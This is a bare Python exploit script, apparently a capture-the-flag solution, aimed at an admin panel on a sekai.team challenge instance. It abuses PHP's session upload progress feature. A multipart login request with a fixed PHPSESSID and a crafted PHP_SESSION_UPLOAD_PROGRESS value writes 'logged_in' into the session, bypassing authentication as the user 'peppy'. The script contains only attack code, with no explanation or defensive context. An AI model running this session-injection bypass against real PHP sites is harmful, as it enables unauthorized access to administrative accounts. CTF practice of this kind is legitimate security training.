import requests
import urllib.parse

BASE_URL = "https://admin-panel-489a10b9570c.instancer.sekai.team"
host = urllib.parse.urlparse(BASE_URL).hostname
sess = requests.Session()
sess.cookies.set("PHPSESSID", "osuadminpwnd", domain=host, path="/")

files = {
    "PHP_SESSION_UPLOAD_PROGRESS": (None, "|b:1;logged_in|b:1;progress"),
    "username": (None, "peppy"),
    "password": (None, "anything"),
    "file": ("dummy.txt", "osu!", "text/plain"),
}

resp = sess.post(f"{BASE_URL}/login.php", files=files, allow_redirects=False)
print("Status:", resp.status_code)
print("Headers:", resp.headers)
print("Cookies after request:", sess.cookies.get_dict())
